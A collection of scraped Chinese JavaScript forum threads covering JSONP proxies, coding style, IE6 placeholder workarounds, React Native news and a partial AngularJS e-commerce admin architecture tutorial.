{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://jsonp.nodejitsu.com/\">https://jsonp.nodejitsu.com/</a></p>\n\n<p>想用Taobao的ip地址服务，怎奈它家不直接提供JSONP调用。<br>\n发现了这个服务，省下自己造轮子的功夫。</p>\n\n<p>例子<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://jsonp.nodejitsu.com/?callback=myCallback&amp;url=http://ip.taobao.com/service/getIpInfo.php?ip=209.177.81.94\">https://jsonp.nodejitsu.com/?callback=myCallback&amp;url=http://ip.taobao.com/service/getIpInfo.php?ip=209.177.81.94</a></p>\n\n<p>不足的是代理国内的接口速度略慢。</p>\n</div></div>"], "reply": "13", "tittle": "JSONProxy， JSON -> JSONP 接口转换服务", "comment": ["自己弄个web中转一下，包个jsonp不就可以了？", "是特别慢，不可用。", "我做还差不多。。。我有国内外专线，无缓存 fetch gravatar 到显示在用户端0.5秒", " Fastly, 跪", " 快做！", " 铜豪！", "淘寶這庫 國內準確性勉強還好 國外差的不行", "基本没多少必要.", "要登录的咋办呢", "自己造个轮子也不麻烦 ... 给我一瓶酒的时间我来写一个玩玩吧 ...", "done ... 地址在 ", " ... \r", "\r", "基础用例和楼主的那个演示完全一样 ... 替换 URL 即可 ... \r", "\r", "额外的高级用法可以指定 charset 或者是否输出 proxy error 等 ...\r", "\r", "目前只完成了功能 ... 文档什么的如果有人用再补吧 ...\r", "\r", "后续可以填的坑暂时想到可以加上个 url shortener 进来 ... \r", "\r", " 总共不到一百行代码 ... 所以 ... 执行力呢 ..?\r", "\r", " 有需要登录的演示吗 ... 我看看能不能解决了 ...", " 要登录就得向proxy提供凭据或cookies吧，这种东西可不能乱给啊", " 麻烦到不麻烦，主要是自己专门做的话，有多出一块维护的东西……能用别人的就不自己做，懒就是这样噜。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原文<a target=\"_blank\" rel=\"nofollow\" href=\"http://bluereader.org/article/7793329\">http://bluereader.org/article/7793329</a><br>\n<code><br>\n[].forEach.call($$(\"*\"),function(a){<br>\n  a.style.outline=\"1px solid #\"+(~~(Math.random()*(1&lt;&lt;24))).toString(16)<br>\n})</code></p>\n\n<p>大家能直接理解上面吗，我不行</p>\n</div></div>"], "reply": "13", "tittle": "大神的调试脚本，每一个单词都有深意啊", "comment": ["给页面的每一个元素增加一个 1px solid 颜色随机的描边....\r", "\r", "$$ 是啥, 浏览器自带的么.", "关于$$: ", " 原文中是有的，chrome控制台专用", "开个地图炮，这难道不只是说明大部分前端程序员连个位运算都不会么……", "PHP程序员也不需要会", "补充一下 那个 ~~(x) 就是取整用的写法。\r", "\r", "但是这样出来的颜色值位数不对大丈夫？", "没学过的可以继续学嘛……\r", "人家这样写是人家的自由，你可以不这样写", "觉得这样写。。。比较难维护。", "好像没觉得有多复杂...", "-_-| 其实完全不需要数学知识就能看懂\r", "\r", "* + for each -> style -> outline -> 1px solid #whatever\r", "\r", "看不懂的得先学英文和CSS再考虑数学", "这是在吐槽js没法forEach一个HTMLCollection么。哈哈哈哈哈。", "github上的140bytes活动中的代码，类似的还有很多在 ", " 颜色值是对的啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.jsmoudle.com\">http://www.jsmoudle.com</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "自己平时代码的积累，希望听听意见", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>同样是修改一个属性</p>\n<div class=\"highlight\"><pre>function f1(o) {\n  o.a++;\n}\n\nfunction f2(o) {\n  return { a: o.a + 1 };\n}\n\nvar obj = { a:0 };\n// f1(obj)\n// obj = f2(obj);\n</pre></div>\n\n<p>你们一般用哪种？side-effect方便是很方便，但是在复杂的程序里，选择functional会比较容易理解问题出在哪里。当然还有效能的考量，毕竟后者制造了新的object。</p>\n\n<p>补充：还有几种情况，例如o.prototype.incr，或者干脆传入o.a再return得到结果。想看看各位取舍的时候有没有一定的思维规则。</p>\n</div></div>", "<div class=\"topic_content\">还有这种，会导致要写比较多的函数，javascript似乎也鼓励这种行为（不一定都可行，有时你可能期望同时更新多个属性，导致一些其他问题）。<br><br>```<br>function f3(o) {<br>  return o.a + 1;<br>}<br><br>var obj = { a:0 };<br>o.a = f3(o);<br>```</div>"], "reply": "6", "tittle": "side-effect 还是 return", "comment": ["自从了解了functional后就没有跨函数使用过副作用，觉得可以显著减少bug。", "第二種，因為第一種在外部看起來，並不確定是否影響了傳入的參數，還是只是根據這個參數去做其它事。", "只给f1 f2要怎么讨论啊？\r", "至少给一下实际场景吧。\r", "不同作用的函数本来就可能会有不同的实现方法。", " 我现在的感觉是，想不到有什么场景f1是更好的选择。", " javascript我不熟不好评论，但是对于大对象，如果你按值返回的话会造成额外拷贝。\r", "至少像C++之类的环境下，sort之类都是原地处理的，就是避免大数据拷贝降低性能。\r", "平时的话一般是选返回新值的，毕竟清晰方便很多。", "大部分情况都倾向于return \r", "一些情况可以side effect 不过一定要有注释"]},
{"content": ["<div class=\"topic_content\">我发现翻页后的返回结果 是在F12中 的 Scripts 选项中.. 而XHR中也没请求。<br>这是怎么回事.</div>"], "reply": "2", "tittle": "关于评论翻页（天猫和京东）", "comment": ["jsonp 请求，开发者工具当成script了", " 谢谢。"]},
{"content": ["<div class=\"topic_content\">需求：<br>登录界面input，鼠标focus隐藏提示文字，blur显示提示文字，ipnut输入文字后不显示提示文字。<br>问题：ie6 无法更改input的type值。<br>解决方案：<br>html：<br>&lt;div class=\"login-ipt-text1\"&gt;请输入用户名&lt;/div&gt;<br>&lt;div class=\"login-ipt-text2\"&gt;请输入密码&lt;/div&gt;<br>&lt;input type=\"text\" value=\"\" class=\"login-ipt1\"&gt;<br>&lt;input type=\"password\" value=\"\" class=\"login-ipt2\"&gt;<br>css：<br>.login-ipt-text1 { position: absolute; top: 173px; left: 37px; width: 167px; height: 43px; background: transparent; border: none; color: #CCC; line-height: 46px; padding-left: 60px; }<br>.login-ipt-text2 { position: absolute; top: 173px; left: 261px; width: 152px; height: 43px; background: transparent; border: none; color: #CCC; line-height: 46px; padding-left: 60px; }<br>.login-ipt1 { position: absolute; top: 173px; left: 37px; width: 167px; height: 43px; background: transparent; border: none; color: #CCC; line-height: 46px; padding-left: 60px; }<br>.login-ipt2 { position: absolute; top: 173px; left: 261px; width: 152px; height: 43px; background: transparent; border: none; color: #CCC; line-height: 46px; padding-left: 60px; }<br>.non { display:none; }<br>js：<br>(function () {<br>    var txt1 = $('.login-ipt-text1'),<br>        txt2 = $('.login-ipt-text2');<br>    $('.login-ipt1, .login-ipt2').focus(function () {<br>        var obj = $(this);<br>        if (obj.hasClass('login-ipt1')) {<br>            txt1.addClass('non');<br>        } else {<br>            txt2.addClass('non');<br>        }<br>    }).blur(function () {<br>        var obj = $(this);<br>        if (obj.val() === '') {<br>            if (obj.hasClass('login-ipt1')) {<br>                txt1.removeClass('non');<br>            } else {<br>                txt2.removeClass('non');<br>            }<br>        }<br>    });<br>}());</div>"], "reply": "9", "tittle": "登录界面 input，鼠标 focus 隐藏提示文字， blur 显示提示文字， ipnut 输入文字后不显示提示文字。", "comment": ["html5+拒绝IE6，可以满足需求，", "为啥要改变type？\r", "可以用placeholder实现。\r", "我自己是通过JS实现的。\r", "onfocus时如果value与预定义的值相等，则value清空。\r", "onblur时判断value是否为空，为空则用预定义的填充。", "楼主，如果你除了这个用不到jQ，没必要引入的啊。", " , 1. 改变type为text是为了显示提示信息时password input不至于显示*****；2. placeholder 是html5，而很多项目客户还是要求支持IE6的；3. 这段代码是节选，整个代码中许多地方要用jQuery；4. 高版本IE及规范浏览器是可以改type的。", "有个jquery.placeholder插件，或者你可以自己写个JS代码兼容不支持plachholder的浏览器", " 不要用背景透明，改用z-index让文字在input上面，然后给文字加点击事件触发input的focus。", " 这个实用，平时插件用得少>_<|||", " input后面还有图~~~", " 好吧，这个倒是没想过……"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://javascript.ruanyifeng.com/\" rel=\"nofollow\">http://javascript.ruanyifeng.com/</a> <br><br>比如我看完阮一峰的基础教程，还是没觉得学到什么，不知道怎么上手开始做一些小的东西。</div>"], "reply": "11", "tittle": "看完一些 Javascript 基础知识，有哪些小项目适合练手？", "comment": ["最近也在自学JS，可以写个计算器或者幻灯片 ，再者可以参考一些前端开发框架的JS组件 自己动手写一个", "我写不出 seajs loader，都不好意思说自己会 js 基础，哎～", "前端学学DOM，去写点控件（特别注意控件的接口和封装设计），比如Slider，标签球，后端的话用node写个博客系统", "看 bootstrap的JS插件，然后自己去实现~保证给力！！", "写个九皇后，五子棋，迷宫什么的", "学完一门语言...我都会去做个计算器，＋－＊／的四则运算。", "alert(3-0.1)\r", "结果不对，我觉得我没学过……", "写个简版 jquery", "可以看下backbone的接口，然后试着写一下……", " 这个太凶恶了吧?", "自己写写幻灯片小姑。自定义下拉菜单，多操作DOM就好了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天看到一个文档，提示有如下两种方式来给defaults对象设置属性：<br>\n// bulk<br>\n$.cookie.defaults = { path: '/', expires: 365 };<br>\n// single<br>\n$.cookie.defaults.path = '/';</p>\n\n<p>对JS的对象不是很了解，上面代码中的bulk方式，用一个JSON对象赋给defaults对象，不会造成defaults对象被覆盖吗？如果被覆盖了，那么该对象的其他属性的默认值岂不是全完了？</p>\n\n<p>难道JS能自动识别赋值的对象是否是object？如果是的话，就只覆盖其中的属性；如果不是对象，则根据赋值对象的类型自动转换？</p>\n</div></div>"], "reply": "11", "tittle": "关于 JS 的对象赋值问题求教！", "comment": ["会覆盖，所以这种情况应该用 underscore.extend ", "\r", "\r", "但估计这个插件应该会自己在内部再维护一个默认选项，所以这个 $.cookie.defaults 就是用来给你直接覆盖的。", "兩個思路", "1. 第一種會覆蓋", "2. 如果是一個setter+getter，可以不覆蓋", "bulk 这种方式，就是你理解的覆盖了，正确的说法应该是给$.cookie.defaults 重新赋予了一个对象，改变了$.cookie的默认参数值。\r", "\r", "`难道JS能自动识别赋值的对象是否是object？如果是的话，就只覆盖其中的属性；如果不是对象，则根据赋值对象的类型自动转换？ `\r", "\r", "对于这句，js当然没这么智能了。", " 参考2楼的 setter，是可以的做到那么智能的。", "1楼的答案还是比较正确的，一般来说，一个结构化的jQuery插件，$.pluginName.defaults这个就是被用户用来覆盖掉的，而插件内部会有一个局部的defaults变量，通过$.extend({}, defaults, $.pluginName.defaults)来生成最终的配置选项", "报告楼主，我是来“找茬”的，第一种里那不是JSON，那是对象字面量。", " 嗯，通过setter确实可以做到", "為什麼不用這個?\r", "\r", "$.cookie.defaults['path'] = '/'\r", "$.cookie.defaults['expires']= 365;", " 那就是JSON，如果你要说不是JSON，那我就不知道你所指的JSON是什么了。虽然这里确实是叫对象字面量。\r", "楼主的问题，第一种确实会覆盖，理由就像你理解的一样，清晰直白。所以我认为楼主困惑的其实是这个文档的说法，它说有两种方法来给defaults对象设置属性，确实这两种都给default设置了属性，但是它没说第一种是通过覆盖的方式来设置的，仅此而已。", "第一种实际就是覆盖了，虽然JS现在有getter/setter了，但是考虑兼容性LZ的上下文里肯定不是这么设计的。\r", "\r", "其他部分的默认值，可以在处理其他部分的时候再写一份  $.cookie.defaults.path || \"/\" 。JS的对象都是不可靠的，类库编写时就应该做这种假设。", " 那真的不是JSON……\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看了下，现在的方案基本都是服务器分词，tier树什么的，最后都是ajax。</p>\n\n<p>有没有什么方案是服务器给出 汉字+拼音全拼，浏览器处理成自动补全的select，这样现成的库有没有方便集成的推荐的呢？</p>\n</div></div>"], "reply": "5", "tittle": "浏览器 js 中文字符+拼音全拼+拼音首字母 自动补全提示，有没有好用的轮子？", "comment": ["你要把输入法搬到前端？", " 做一个方便选择的东西而已。目前<select> 已经有1000+的东西了。急需过滤。", " 你可以按照我说的方向去搜啊，原理类似", "  和输入法有相似之，但是不完全是输入法吧。\r", "\r", "找到个 twitter.github.io/typeahead.js/\r", "\r", "喷文  ", "还有个chosen可以瞅瞅\r"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://twitter.com/floydophone/status/560503411389390848\" rel=\"nofollow\">https://twitter.com/floydophone/status/560503411389390848</a><br><a target=\"_blank\" href=\"https://news.ycombinator.com/item?id=8961551\" rel=\"nofollow\">https://news.ycombinator.com/item?id=8961551</a><br><br>没有 Dom，没有 WebView，可以用 ReactJS 写原生界面。<br>支持 CSS 的一部分子集： <a target=\"_blank\" href=\"https://github.com/facebook/css-layout\" rel=\"nofollow\">https://github.com/facebook/css-layout</a></div>"], "reply": "12", "tittle": "Use ReactJS to Build Native Apps", "comment": ["so cool", "JS 统治世界？", "reactjs 相互独立的组件之间怎么通信?  不是父子包含关系的那种", " 事件？ on, trigger, subscribe, publish, unsubscirbe", " react文档不是有说明，定义一个全局事件源", "先別太激動，靜待觀察，多半是噱头。", "尽管我不怎么喜欢 Facebook 这个 SNS 产品, 但是 FB 出品的一些开源技术还是很有品位的, 从 Reactjs 开始到一系列的JS 和 iOS 开源库", "\r", "已经在生产环境使用上了\r", "不过只是iOS", "已经在facebook group ios版上使用了，视频中的霸气可真是有底气，hybrid app难道不都是shit?", "感觉有点卡，IOS上。昨天也关注了", "表示视频已经转土豆了, 戳 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>老的站倒了，新的镜像站都不是太给力，楼主主要想找个过linkbucks的脚本，貌似都失效了</p>\n\n<p>小伙伴有推荐吗？</p>\n</div></div>"], "reply": "6", "tittle": "greasemonkey 的脚本现在哪里比较多？", "comment": ["\r", "这个看看？", "还有一个\r", "\r", "这个脚本没那么多，但界面好些。", "试过了一部分，貌似都过不了，这站脚本补漏真够可以的", "\r", "\r", "\r", "补充2个\r", " （比较少\r", " （另一个镜像站", "火狐贴吧，精品帖子"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在研究canvas重力效果 做的<br>\n之前还有一个 发错节点了<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://jsfiddle.net/xq4t86a2/\">http://jsfiddle.net/xq4t86a2/</a><br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://jsfiddle.net/q0kLmtp3/1/\">http://jsfiddle.net/q0kLmtp3/1/</a></p>\n\n<p>注意requestAnimationFrame比setInterval效果好</p>\n</div></div>"], "reply": "1", "tittle": "Canvas 喷泉小球", "comment": ["moved to "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Mprogress.js -- Google Material Design progress linear bar. </p>\n\n<p>基于谷歌material设计的4种进度条，CSS3+HTML5,不依赖其他js库，</p>\n\n<p>干掉转菊花的体验从这里开始！</p>\n\n<p>丰富的配置功能，精美的界面，快来fork and star吧 ^_^</p>\n\n<p>项目首页： <a target=\"_blank\" rel=\"nofollow\" href=\"http://lightningtgc.github.io/MProgress.js/\">http://lightningtgc.github.io/MProgress.js/</a></p>\n\n<p>Github地址： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/lightningtgc/MProgress.js\">https://github.com/lightningtgc/MProgress.js</a></p>\n</div></div>"], "reply": "5", "tittle": "Mprogress.js-Google Material Design 进度条", "comment": ["好！", "不错，android的webview上性能怎样", "一开始就是为移动端研发的，\r", "后面几种类型采用的是css3的动画，\r", "性能要比js的动画好", "个人感觉还是原版的 nprogress 好点，这个感觉太花哨 ==》个人感觉，可能也是先入为主", " 风格和设计理念不一样，实现上也不太一样，不过多个选择也是好事嘛^.^"]},
{"content": ["<div class=\"topic_content\">现在在维护一段代码，10好几个js文件，一个main.js做入口。而且都是以script tag的src被引入html文件。<br>问题是，发现main文件里有很多变量是在其他js文件里定义的全局变量，如果需要找到具体的定义和初始化过程，需要一个一个的文件去浏览才能找到，非常不容易维护。<br><br>请问在处理不同js文件里定义全局变量的时候，怎么处理才能让这样的变量在其他文件中一眼看出来自于哪，进行过怎样的初始过程？</div>"], "reply": "2", "tittle": "求教一个管理 global scope variable 的好的设计代码方式", "comment": ["能不用就不用", "try not to use it at all in the first place.\r", "\r", "In your case, you can create a config file to include all the global variable."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原来是这样的  <img src=\"http://i.stack.imgur.com/YK15P.jpg\" alt=\"1\"></p>\n\n<p>点击红框后<br>\n<img src=\"http://i.stack.imgur.com/2T2e7.jpg\" alt=\"1\"></p>\n\n<p>JS应该怎么写 <br>\n尝试这汇总写法！ <br>\n <a target=\"_blank\" rel=\"nofollow\" href=\"http://jsfiddle.net/18932t45/\">http://jsfiddle.net/18932t45/</a><br>\n &lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd%22%3E\">http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;</a><br>\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\"&gt;<br>\n&lt;head&gt;<br>\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\"&gt;<br>\n    &lt;title&gt;test&lt;/title&gt;<br>\n    &lt;script src=\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"&gt;&lt;/script&gt;<br>\n    &lt;script&gt;<br>\n    $(function (){<br>\n        $('.block').eq(1).click(function(event) {<br>\n        $('.block').eq(1).width(400)<br>\n        });<br>\n    })</p>\n<div class=\"highlight\"><pre>&lt;/script&gt;\n&lt;style&gt;\n.fl{float: left;}\n.content{\n    width: 1200px;\n    height: 500px;\n    margin: 0 auto;\n    border:1px solid #cccccc;\n    margin-top: 150px;\n    text-align: center\n\n}\n.content .block{\n    width: 300px;\n    height: 300px;\n    background-color: green;\n    margin: 10px;\n}\n.content .block .main{\n    text-align: center;\n}\n.content .block .block{\n    width: 300px;\n    height: 300px;\n    background-color: grey;\n    margin: 10px;\n}\n\n&lt;/style&gt;\n</pre></div>\n\n<p>&lt;/head&gt;<br>\n&lt;body&gt;<br>\n    &lt;div class=\"content\"&gt;<br>\n        &lt;div class=\"block fl\"&gt;<br>\n            &lt;div class=\"main\"&gt;asda&lt;/div&gt;<br>\n        &lt;/div&gt;<br>\n        &lt;div class=\"block fl\"&gt;<br>\n            &lt;div class=\"main\"&gt;&lt;/div&gt;<br>\n        &lt;/div&gt;<br>\n        &lt;div class=\"block fl\"&gt;<br>\n            &lt;div class=\"main\"&gt;&lt;/div&gt;<br>\n        &lt;/div&gt;<br>\n    &lt;/div&gt;<br>\n&lt;/body&gt;<br>\n&lt;/html&gt;</p>\n\n<p>但是 效果不是我想要的！<br>\n求教 应该如何布局 与编写</p>\n</div></div>"], "reply": "1", "tittle": "如何制作这个特效", "comment": ["之前看过的一个效果，不过跟你这个不太一样。\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ul>\n<li>0、导言</li>\n<li>1、准备工作</li>\n<li>2、构建框架</li>\n<li>3、丰富你的directives</li>\n<li>4、公用的services</li>\n<li>5、用controllers组织业务</li>\n</ul>\n\n<h1>导言</h1>\n\n<p>纵览线上各种AngularJS教程，大部分都是基础与一些技巧分析。<br>\n如果你已经能运行你的ng-app，但又找不到实际案例可以参考。那么本文应该对您有所帮助。<br>\n本文将以电商产品：<a target=\"_blank\" rel=\"nofollow\" href=\"https://youhaosuda.com/\">友好速搭</a> 其中的 <a target=\"_blank\" rel=\"nofollow\" href=\"https://youhaosuda.com/account/login\">店铺后台</a> 作为的实际案例，裸奔展示如何从零构建<del>“自以为大型的”</del>AngularJS应用。<br>\n应用基于AngularJS 1.2.24版本。</p>\n\n<h1>准备工作</h1>\n\n<p>1、我们使用了以类型优先的目录结构。<br>\n├── js<br>\n│   ├── app.js<br>\n│   ├── directives.js<br>\n│   ├── services.js<br>\n│   ├── controllers<br>\n│   │   ├── BaseController.js // controller基类<br>\n│   │   ├── Customer.js       // 顾客管理<br>\n│   │   ├── Product.js        // 商品管理<br>\n│   │   ├── Order.js          // 订单管理<br>\n│   │   ├── Domain.js         // 域名管理<br>\n│   │   ├── Payment.js        // 收款方式<br>\n│   │   └── ...               // 其他各种controller<br>\n│   ├── directives<br>\n│   │   ├── ysBtn.js       // 按钮组件<br>\n│   │   ├── ysCalendar.js  // 日历组件<br>\n│   │   ├── ysImgeditor.js // 图片编辑器<br>\n│   │   ├── ysPopWindow.js // 模态弹窗组件<br>\n│   │   └── ...            // 其他各种组件<br>\n│   └── services<br>\n│   │   ├── Graphic.js // 图片文件处理service<br>\n│   │   ├── Popup.js   // 弹层service<br>\n│   │   ├── Uri.js     // 与Uri相关操作service ($http等ajax操作封装于此)<br>\n│   │   └── ...        // 其他各种service<br>\n│   ├── config<br>\n│   │   ├── Navigation.js    // 主导航配置<br>\n│   │   ├── Route.js         // 路由配置<br>\n│   │   ├── RouteProvider.js // 配置$routeProvider<br>\n│   │   ├── OnRootScope.js   // 为$rootScope配置$onRootScope方法<br>\n│   │   ├── SceDelegate.js   // 配置$sceDelegateProvider<br>\n│   │   ├── Uri.js           // 后端服务API配置<br>\n│   │   └── ...              // 其他各种config<br>\n├── lib<br>\n│   ├── bower_components<br>\n│   │   ├── angular<br>\n│   │   │   ├── angular.min.js<br>\n│   │   │   └── ...<br>\n│   │   ├── angular-route<br>\n│   │   ├── angular-sanitize<br>\n│   │   ├── angular-route<br>\n│   │   └── ... // 其他bower管理的lib<br>\n│   ├── URI.min.js<br>\n│   ├── class.js<br>\n│   └──  ... // 其他手动管理的lib<br>\n├── img<br>\n├── css<br>\n└── html  // controllers对应的views的模板</p>\n\n<p>2、使用less作为css的预处理器。<br>\n3、使用bower管理依赖的JS库。<br>\n4、使用grunt作为项目打包工具。<br>\n5、使用fiddler4作为http请求调试工具。<br>\n6、为了可以使用庞大的jquery插件库，我们也引入了jquery。<br>\n7、controllers、directives、services 等部分的设计参考自： <a target=\"_blank\" rel=\"nofollow\" href=\"http://trochette.github.io/Angular-Design-Patterns-Best-Practices/\">http://trochette.github.io/Angular-Design-Patterns-Best-Practices/</a></p>\n\n<p>准备了半天，访问如下的index页面，angular 的应用是时候跑起来了。<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d7d0aaba8c703b000002/24.png?v=1422972880\" alt=\"应用代码展示\"></p>\n\n<p>一个实际的案例看起来总是要比教程复杂些。下面是项目启动后友好速搭店铺后台的概貌。<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e47aaba8c3e13000008/2.png?v=1422949959\" alt=\"店铺后台\"></p>\n\n<p>什么？不是说好的从零开始构建吗？怎么就跑起来了？<br>\n好吧，请把上面这个预览图当做设计稿。我们开始构建框架。</p>\n\n<h1>构建框架</h1>\n\n<p>根据设计，从结构上将页面划分为</p>\n\n<p>顶部 &lt;div class='fw-topbar' ng-controller='TopbarController'&gt;&lt;/div&gt;<br>\n导航 &lt;ys-navigation ng-controller='ysNavigationController' ng-show='initDone'&gt;&lt;/ys-navigation&gt;<br>\n内容 &lt;div class='fw-main-content' id='main_cnt' ng-view=''&gt;&lt;/div&gt;<br>\n导航的点击会改变浏览器当前的url，内容区域渲染对应模块的内容。</p>\n\n<p>下面开始配置angularJS，来达到上面的目标。<br>\n在 js/app.js 配置 YeeshopManager 这个 module，并将它的引用赋值到全局变量YeeshopManagerModule，方便后续继续对其进行配置。<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e478757db4103000005/3.png?v=1422949959\" alt=\"配置module\"></p>\n\n<p>为了方便管理众多directives与services。我们分别创建了<br>\njs/directives.js  集合所有directives的module - YeeshopManager.directives<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e484812f23e1a000002/4.png?v=1422949960\" alt=\"配置directives\"></p>\n\n<p>js/services.js  集合所有services的module - YeeshopManager.services<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e498757db41c8000002/5.png?v=1422949961\" alt=\"配置services\"></p>\n\n<p>接下来，配置应用为不同路径的请求调用对应的 controller与模板<br>\n在 config/Route.js 中先定义好的规则<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e4a4812f23e1a000005/6.png?v=1422949962\" alt=\"配置Route.js\"></p>\n\n<p>在 config/RouteProvider.js 中配置 $routeProvider<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e4b8757db4103000008/7.png?v=1422949963\" alt=\"配置$routeProvider\"></p>\n\n<p>当我们使用 #/guide 路径访问友好速搭店铺后台的新手引导页面的时候，<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e4baaba8c3e2c000003/8.png?v=1422949963\" alt=\"ngview\"><br>\nngRoute将为这个index文件上带有ng-view的节点渲染对应的模板 guide.html 并且运行对应的 GuideController。</p>\n\n<p>结构上划分的三个区域对应的controller的关系<br>\n顶部 -&gt; TopbarController<br>\n导航 -&gt; ysNavigationController<br>\n内容 -&gt; 由ngRoute动态的根据当前url和配置，加载对应模块的内容。<br>\n至此，大体的结构已经完成。</p>\n\n<p>每个Controller创建的$scope都能独立很好的运行，但有时$scope之间也需要通讯。这时，我们需要为$rootScope配置一个方法，来完成这个工作。</p>\n\n<p>在 config/OnRootScope.js 中配置 $rootScope<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e4c4812f23e1a000008/9.png?v=1422949964\" alt=\"配置rootScope\"><br>\n使用$provide的decorator方法在$rootScope注册的时候，注入一个 $onRootScope 的方法。</p>\n\n<p>需要被通知的$scope调用 $onRootScope来监听事件'notification',<br>\n发出通知的controllers, directives,或 services中，只需要注入 $rootScope 服务。就可以很方便的进行通知。<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e4d4812f23e0a000002/10.png?v=1422949965\" alt=\"收到通知\"></p>\n\n<p>友好速搭作为一款SAAS产品，支持商家自行绑定域名，让用户更好的记住您的域名和品牌。</p>\n\n<p>angularJS构建的应用程序，需要将静态资源部署在CDN上，来保证用户访问的快速流畅。<br>\n那么，如果我绑定了 <a target=\"_blank\" rel=\"nofollow\" href=\"http://myshop.com/\">http://myshop.com/</a> ，店铺后台的地址就会是 <a target=\"_blank\" rel=\"nofollow\" href=\"http://myshop.com/admin%EF%BC%8C\">http://myshop.com/admin，</a><br>\n这时CDN静态资源的地址会是形如 <a target=\"_blank\" rel=\"nofollow\" href=\"http://cdn.com/js/app.js%E3%80%82\">http://cdn.com/js/app.js。</a><br>\n当应用的host <a target=\"_blank\" rel=\"nofollow\" href=\"http://myshop.com/\">http://myshop.com/</a> 和引用资源的host <a target=\"_blank\" rel=\"nofollow\" href=\"http://cdn.com/\">http://cdn.com/</a> 不一致时，<br>\nangular会告诉你 Error: [$sce:insecurl] ,资源因安全策略而加载失败。</p>\n\n<p>配置资源白名单$sceDelegateProvider.resourceUrlWhitelist，允许angular跨域请求指定的url的资源。<br>\n<img src=\"https://asset.ibanquan.com/image/54d07e4e8757db410300000e/11.png?v=1422949966\" alt=\"白名单\"><br>\n至此，我们完成对YeeshopManagerModule的配置。</p>\n\n<h1>丰富你的directives</h1>\n\n<p>框架构建完成了，参考第二节中的设计稿，接下来我们需要为系统添加各种UI组件。比如图标、按钮、下拉菜单、弹窗。依照angularJS创始人Misko Hevery设计的初衷：<br>\n“构建UI应该是声明式的。”<br>\n那么，我们也设计自己的规则，来声明UI组件：</p>\n\n<p>图标 &lt;ys-ico&gt;&lt;/ys-ico&gt;<br>\n按钮 &lt;ys-btn&gt;&lt;/ys-btn&gt;<br>\n下拉菜单 &lt;ys-dropdown&gt;&lt;/ys-dropdown&gt;<br>\n弹窗 &lt;ys-popupwindow&gt;&lt;/ys-popupwindow&gt;<br>\n……</p>\n\n<p>完成了以上的思(yi)考(yin)，我们着手来声明图标组件。<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d0e2aaba8c6c81000002/12.png?v=1422971106\" alt=\"声明图标组件\"></p>\n\n<p>声明完成后，我们在模板里面进行调用。<br>\n<code><br>\n&lt;ys-ico type=\"trade\"&gt;&lt;/ys-ico&gt;<br>\n</code></p>\n\n<p>经过angularJS的编译之后输出的节点与实际效果。<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d0e38757db7158000002/13.png?v=1422971107\" alt=\"图标效果\"></p>\n\n<p>对于这个通用的自定义标签&lt;ys-ico&gt;，我们习惯用“组件”来称呼他。在angularJS中，称为一个directive。官方文档中的定义请<a target=\"_blank\" rel=\"nofollow\" href=\"https://docs.angularjs.org/guide/directive\">越过山丘 虽然已白了头~~</a></p>\n\n<p>使用强大的directive。我们可以将系统中需要复用的所有组件、甚至一个复用的行为全部抽象出来。当你需要使用的时候，你只是需要声明他。<br>\n例如，一个旋转的图标：<br>\n<code><br>\n&lt;ys-ico keepRotating type=\"trade\"&gt;&lt;/ys-ico&gt;<br>\n</code></p>\n\n<p>友好速搭项目早期规划的directive<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d0e58757db7158000005/15.png?v=1422971109\" alt=\"展示\"></p>\n\n<p>按照需求增加了水印编辑器directive<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d0e5aaba8c6c81000005/16.png?v=1422971110\" alt=\"水印编辑器\"></p>\n\n<p>方便商户编辑图片，增加了图片编辑器directive<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d0e68757db7158000008/17.png?v=1422971110\" alt=\"图片编辑器\"></p>\n\n<p>这时候，前端工程师的问题就来了：“还有多少directives？”<br>\n<img src=\"https://asset.ibanquan.com/image/54d0d0e74812f26d5f000005/18.png?v=1422971111\" 